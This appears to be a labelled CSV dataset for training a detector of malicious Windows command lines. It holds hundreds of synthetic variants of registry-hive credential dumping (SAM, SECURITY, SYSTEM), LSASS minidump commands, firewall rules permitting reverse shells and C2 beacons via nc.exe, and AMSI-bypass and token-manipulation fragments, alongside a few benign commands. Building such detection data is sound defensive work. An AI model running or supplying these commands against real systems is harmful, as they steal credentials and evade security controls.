text,label
reg save hklm\sam c:\windows\temp\y2w0efhx.save,1
"powershell -nop -c ""powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\ppiqj611.dat""""",1
reg export hklm\system c:\windows\temp\6vm9ahei.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\5mnhghf5.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\valnr62y.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\vfxdd9ue.dat""",1
reg export hklm\security c:\windows\temp\et4x2fxb.save,1
reg export hklm\system c:\windows\temp\0k6bwzs8.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\e5btnrt4.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\e007aahn.dat""",1
reg save hklm\system c:\windows\temp\o1bspikt.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\7ffyt34u.dat""",1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\ix5jw9vf.dat""",1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\19ul38hn.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\n9v6k2mo.dat""",1
reg save hklm\security c:\windows\temp\1sqlr0ox.save,1
"powershell -nop -c ""powershell -nop -c ""reg save hklm\sam c:\temp\6474yc2c.dat""""",1
"powershell -nop -c ""reg  export  hklm\sam  c:\windows\temp\9b6ncms4.save""",1
reg export hklm\security c:\windows\temp\i628fk4g.save,1
"powershell -nop -c ""rule:  exfil  data  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg save hklm\sam c:\windows\temp\e1sujgmx.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\h1vkhyx5.dat""",1
reg  export  hklm\sam  c:\windows\temp\cnm0o2pp.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\pc08io5u.dat""",1
reg export hklm\system c:\windows\temp\qxdd9jzo.save,1
reg save hklm\sam c:\windows\temp\megqet2q.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\fhk20fh0.dat""",1
reg export hklm\sam c:\windows\temp\14gza0h9.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\hg11toty.dat""",1
reg export hklm\system c:\windows\temp\kjn5jusm.save,1
reg save hklm\system c:\windows\temp\8owt7nel.save,1
reg export hklm\system c:\windows\temp\077rvlv3.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\qu9pcvqf.dat""",1
reg save hklm\sam c:\windows\temp\purnjzsw.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\h821tk58.dat""",1
reg export hklm\security c:\windows\temp\5zcett49.save,1
reg save hklm\sam c:\windows\temp\zltw9r4j.save,1
reg save hklm\system c:\windows\temp\mhxqyyke.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\d3rgquli.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\9x8iihfd.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\1rgikn1z.dat""",1
reg export hklm\system c:\windows\temp\5364e1rj.save,1
reg export hklm\system c:\windows\temp\9ying7e4.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\kxoqa4su.dat""",1
"powershell -nop -c ""rule:   reverse   shell   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
reg export hklm\sam c:\windows\temp\tjy1lyl6.save,1
reg export hklm\security c:\windows\temp\3o4s51yj.save,1
reg export hklm\system c:\windows\temp\vw3omfbo.save,1
reg export hklm\security c:\windows\temp\1qhxf6t8.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\bwa7nxij.dat""",1
reg export hklm\sam c:\windows\temp\91kjimaj.save,1
reg  save  hklm\sam  c:\windows\temp\9e4gdfad.save,1
reg save hklm\system c:\windows\temp\z3d5wa87.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\8rr75qqv.dat""",1
reg export hklm\security c:\windows\temp\ai0dup4p.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\0n9osic8.dat""",1
reg export hklm\sam c:\windows\temp\5suio2by.save,1
reg export hklm\system c:\windows\temp\y2b52t07.save,1
"powershell -nop -c ""cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\cy8c1xni.dat""""",1
reg save hklm\system c:\windows\temp\e9z8jx4r.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\nsv2oa31.dat""",1
reg save hklm\sam c:\windows\temp\m8wyk2xs.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\hmoxrkl9.dat""",1
reg  export  hklm\security  c:\windows\temp\wf9pb97d.save,1
reg save hklm\security c:\windows\temp\w9483kwr.save,1
"powershell -nop -c ""cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\pvy8ezza.dat""""",1
reg save hklm\system c:\windows\temp\yivm4132.save,1
"cmd.exe /c ""rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
"cmd.exe /c ""reg save hklm\sam c:\temp\rgimq0d0.dat""",1
reg save hklm\security c:\windows\temp\ecegr0j9.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\1bdt2yf4.dat""",1
"cmd.exe /c ""reg   export   hklm\sam   c:\windows\temp\1zqyo9yq.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\x9546n14.dat""",1
reg export hklm\system c:\windows\temp\72qkblsw.save,1
reg export hklm\sam c:\windows\temp\nnmbgy4j.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\5d67ec2m.dat""",1
"cmd.exe /c ""rule:   exfil   data   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"powershell -nop -c ""reg save hklm\sam c:\temp\audgkxob.dat""",1
reg save hklm\sam c:\windows\temp\y0ar9g38.save,1
reg export hklm\sam c:\windows\temp\0vikimpo.save,1
"powershell -nop -c ""rule: c2 beacon | app: any | dir: outbound | act: allow | port: 1337""",2
"powershell -nop -c ""reg save hklm\security c:\temp\pawybn23.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\mbna55b8.dat""",1
$a = [ref].assembly.gettype('system.management.automation.openprocesstoken'),3
"powershell -nop -c ""$a   =   [ref].assembly.gettype('system.management.automation.impersonateloggedonuser')""",3
"cmd.exe /c ""reg export hklm\security c:\temp\3iz45eig.dat""",1
reg save hklm\sam c:\windows\temp\r5aan46o.save,1
reg save hklm\sam c:\windows\temp\lh8x8zsi.save,1
reg save hklm\sam c:\windows\temp\q71k3ws7.save,1
reg export hklm\sam c:\windows\temp\tgkohbpb.save,1
"powershell -nop -c ""[dllimport(""advapi32.dll"")]   extern   bool   amsiutils(...)""",3
reg export hklm\system c:\windows\temp\yaxalk6c.save,1
reg save hklm\security c:\windows\temp\o0fe4kqm.save,1
reg save hklm\sam c:\windows\temp\wro8pon7.save,1
rule:   c2   beacon   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   4444,2
"powershell -nop -c ""reg  save  hklm\sam  c:\windows\temp\r3ichfoc.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\k8qbn2kd.dat""",1
"cmd.exe /c ""[dllimport(""advapi32.dll"")] extern bool amsiutils(...)""",3
reg save hklm\system c:\windows\temp\2wjcpwk1.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\voyoa9fn.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\2afsfwco.dat""",1
"cmd.exe /c ""powershell -nop -c ""reg save hklm\sam c:\temp\7szc2325.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\d9srkpjf.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\ln1kteqp.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\32ray1po.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\u4i5j5f7.dat""",1
reg export hklm\security c:\windows\temp\5sb0jwzs.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\y5xqttz9.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\zw057stg.dat""",1
reg export hklm\security c:\windows\temp\hx6b2fmo.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\hjrakghx.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\htv3law4.dat""",1
"cmd.exe /c ""rule:   c2   beacon   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"cmd.exe /c ""$a   =   [ref].assembly.gettype('system.management.automation.duplicatetokenex')""",3
"powershell -nop -c ""reg save hklm\sam c:\temp\nbadyo6p.dat""",1
reg save hklm\sam c:\windows\temp\rps2klgz.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\oc7ny936.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\c0djljjg.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\urxy3b9o.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\p64kyuky.dat""",1
reg export hklm\sam c:\windows\temp\c9vu7llu.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\nv9x8r8w.dat""",1
"powershell -nop -c ""node  server.js  --port  3000""",0
"cmd.exe /c ""reg export hklm\sam c:\temp\naaf1pgo.dat""",1
klist   purge,3
"cmd.exe /c ""reg export hklm\sam c:\temp\ysbjzx8v.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\822pnh7w.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\2w4mgwsr.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\ko84p1xw.dat""",1
rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337,2
reg export hklm\sam c:\windows\temp\kmdlclzt.save,1
reg  export  hklm\system  c:\windows\temp\63psxmrj.save,1
reg export hklm\sam c:\windows\temp\67u8gcci.save,1
"cmd.exe /c ""rundll32.exe  c:\windows\system32\comsvcs.dll,  minidump  1234  c:\temp\lsass.dmp  full""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\0hljjby1.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\4gp49puk.dat""",1
reg export hklm\security c:\windows\temp\imggrfy4.save,1
reg export hklm\system c:\windows\temp\o3bngvaa.save,1
reg  export  hklm\system  c:\windows\temp\vqhjq8ma.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\fha7gdgx.dat""",1
reg export hklm\system c:\windows\temp\th1yceif.save,1
"cmd.exe /c ""$a = [ref].assembly.gettype('system.management.automation.duplicatetokenex')""",3
reg save hklm\security c:\windows\temp\zev769ho.save,1
"cmd.exe /c ""klist  purge""",3
"powershell -nop -c ""reg export hklm\sam c:\temp\qgerznn6.dat""",1
reg save hklm\sam c:\windows\temp\pjtyxtcc.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\pj8p06m4.dat""",1
reg save hklm\sam c:\windows\temp\5y0s6irg.save,1
"cmd.exe /c ""rule: c2 beacon | app: any | dir: outbound | act: allow | port: 1337""",2
"cmd.exe /c ""reg export hklm\sam c:\temp\qxooj5in.dat""",1
reg export hklm\system c:\windows\temp\liuducy1.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\sjnndcey.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\c2vvsfyv.dat""",1
reg save hklm\sam c:\windows\temp\7ga6gkjd.save,1
reg export hklm\system c:\windows\temp\ldchegnf.save,1
reg export hklm\system c:\windows\temp\9pl6hntx.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\p9j68d4l.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\l199djes.dat""",1
reg export hklm\system c:\windows\temp\wlt753i1.save,1
reg save hklm\security c:\windows\temp\7mxi87v7.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\0zg2ifot.dat""",1
"powershell -nop -c ""$a   =   [ref].assembly.gettype('system.management.automation.amsiutils')""",3
"cmd.exe /c ""reg export hklm\security c:\temp\ly5u95mo.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\y5r3b1m5.dat""",1
reg save hklm\sam c:\windows\temp\e72ziyr5.save,1
reg save hklm\sam c:\windows\temp\x9t8jwiz.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\jj6d9ug7.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\3o0rtve7.dat""",1
reg export hklm\system c:\windows\temp\rdu1hj3l.save,1
reg   export   hklm\sam   c:\windows\temp\mj3sb8t4.save,1
reg save hklm\system c:\windows\temp\3khfq4ez.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\sbaaozc6.dat""",1
"powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\mv9umfwi.dat""",1
"powershell -nop -c ""reg   export   hklm\sam   c:\windows\temp\3c0fzxq6.save""",1
reg save hklm\security c:\windows\temp\cxim2244.save,1
reg save hklm\sam c:\windows\temp\dnz7uvp8.save,1
reg save hklm\system c:\windows\temp\euy2c47w.save,1
"cmd.exe /c ""[dllimport(""advapi32.dll"")]   extern   bool   amsiutils(...)""",3
reg export hklm\system c:\windows\temp\rf5lnera.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\1spxrh88.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\sm4sr94n.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\qx73rfvr.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\o7xe42yc.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\z5jacivb.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\wydc0luk.dat""",1
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\xtk9qmd8.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\ywin6vu9.dat""",1
reg save hklm\sam c:\windows\temp\06ci5dpf.save,1
"cmd.exe /c ""reg  export  hklm\system  c:\windows\temp\wzq2u17x.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\13zesvwa.dat""",1
"powershell -nop -c ""rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full""",1
reg export hklm\sam c:\windows\temp\i9cp2mms.save,1
reg export hklm\security c:\windows\temp\ndxksu6m.save,1
reg save hklm\system c:\windows\temp\jjr6g67q.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\e3yigq4p.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\tyhq8kmx.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\gemndpxu.dat""",1
reg export hklm\system c:\windows\temp\nejtpiky.save,1
reg export hklm\security c:\windows\temp\g0z4ml52.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\5s9i0fmd.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\wh7hieub.dat""",1
reg export hklm\security c:\windows\temp\k0p3708o.save,1
"powershell -nop -c ""reg   save   hklm\system   c:\windows\temp\ueskymyo.save""",1
"cmd.exe /c ""reg export hklm\security c:\temp\udpvdlms.dat""",1
"cmd.exe /c ""backup-utility  save  registry  config""",0
"powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\biz3nyxr.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\ezank6gm.dat""",1
"cmd.exe /c ""reg save hklm\security c:\windows\temp\o1twmawd.save""",1
reg save hklm\sam c:\windows\temp\ou6x4maw.save,1
"cmd.exe /c ""node  server.js  --port  3000""",0
reg export hklm\sam c:\windows\temp\uq0y64pd.save,1
reg save hklm\security c:\windows\temp\ro35psa1.save,1
reg save hklm\security c:\windows\temp\64adycnp.save,1
reg export hklm\security c:\windows\temp\ucxjohec.save,1
"powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\wu3yis6f.dat""",1
"cmd.exe /c ""rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\3xjevwol.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\y7jrfwq3.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\v2uzhkep.dat""",1
"cmd.exe /c ""rule:   exfil   data   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"powershell -nop -c ""reg export hklm\sam c:\temp\2bit63uk.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\idcyj6tf.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\d3prkszr.dat""",1
reg export hklm\system c:\windows\temp\rk3267b3.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\jwop65it.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\6ng32hdt.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\u03yt235.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\lo0zzs3i.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\473o97d0.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\24wjdm2f.dat""",1
reg export hklm\system c:\windows\temp\b5j1nbv4.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\sg4xh8j8.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\omq90710.dat""",1
reg save hklm\system c:\windows\temp\ye9wv4oi.save,1
reg export hklm\system c:\windows\temp\u6ykllo4.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\kizdo0mq.dat""",1
"cmd.exe /c ""reg   save   hklm\security   c:\windows\temp\gmpjihpx.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\sfpirnc8.dat""",1
"cmd.exe /c ""powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\tf2cfkib.dat""""",1
reg save hklm\security c:\windows\temp\kgfkw8oa.save,1
reg save hklm\security c:\windows\temp\5we2rrad.save,1
reg save hklm\sam c:\windows\temp\ih5oznxl.save,1
reg save hklm\security c:\windows\temp\h6gwjym9.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\utxn6j5f.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\s6146bom.dat""",1
"cmd.exe /c ""reg  save  hklm\sam  c:\windows\temp\yyrde7ne.save""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\y0kk6cjf.dat""",1
reg save hklm\security c:\windows\temp\a71k9xft.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\pud3ky1o.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\ttxcwysl.dat""",1
"cmd.exe /c ""reg  save  hklm\sam  c:\windows\temp\3u8vaxfg.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\sr06fl0b.dat""",1
"cmd.exe /c ""powershell -nop -c ""reg save hklm\sam c:\temp\nphnkg6d.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\m81cp055.dat""",1
"powershell -nop -c ""powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\a85eyusr.dat""""",1
"cmd.exe /c ""reg   export   hklm\sam   c:\windows\temp\6p1zvqkx.save""",1
reg save hklm\sam c:\windows\temp\delhfmow.save,1
rule: reverse shell | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: tcp 8888,2
reg  export  hklm\security  c:\windows\temp\7gzygwyq.save,1
"cmd.exe /c ""select-string   -path   c:\logs\app.log   -pattern   'failed   logon'""",0
"powershell -nop -c ""rule:  c2  beacon  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
reg export hklm\security c:\windows\temp\evvsywak.save,1
reg save hklm\system c:\windows\temp\ijg12krq.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\r5pa0dfn.dat""",1
reg save hklm\system c:\windows\temp\whrltxiz.save,1
python   -m   http.server   8080,0
reg export hklm\system c:\windows\temp\qtohuhnq.save,1
reg export hklm\system c:\windows\temp\e3ug4jbr.save,1
reg export hklm\sam c:\windows\temp\732akq4l.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\3koevbmi.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\0sjvc3nf.dat""",1
"cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\f3teq344.dat""",1
reg export hklm\security c:\windows\temp\7dqj8fif.save,1
"powershell -nop -c ""rule:  reverse  shell  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
"cmd.exe /c ""reg save hklm\sam c:\temp\6wmit9yx.dat""",1
reg save hklm\system c:\windows\temp\qryydrbf.save,1
reg save hklm\system c:\windows\temp\t9z8iy1e.save,1
reg save hklm\system c:\windows\temp\0rko6zjg.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\6go97c5z.dat""",1
reg save hklm\sam c:\windows\temp\6gti13j3.save,1
reg export hklm\system c:\windows\temp\iffqsuug.save,1
reg export hklm\sam c:\windows\temp\j1nuiiv3.save,1
reg save hklm\security c:\windows\temp\tbv8fu0e.save,1
"cmd.exe /c ""reg   save   hklm\system   c:\windows\temp\u3ul4j68.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\mbbr5gv9.dat""",1
"cmd.exe /c ""rule:   c2   beacon   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
reg save hklm\sam c:\windows\temp\q30r0325.save,1
reg save hklm\system c:\windows\temp\8p3kkzru.save,1
"powershell -nop -c ""powershell -nop -c ""reg save hklm\security c:\temp\as875kf4.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\wu2phci0.dat""",1
"powershell -nop -c ""[dllimport(""advapi32.dll"")]  extern  bool  openprocesstoken(...)""",3
reg save hklm\system c:\windows\temp\14qnjdjh.save,1
"cmd.exe /c ""rule:  exfil  data  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
"powershell -nop -c ""klist  purge""",3
reg save hklm\system c:\windows\temp\di2qkx1d.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\f39mumyc.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\rt9abk93.dat""",1
"powershell -nop -c ""java -jar application.jar""",0
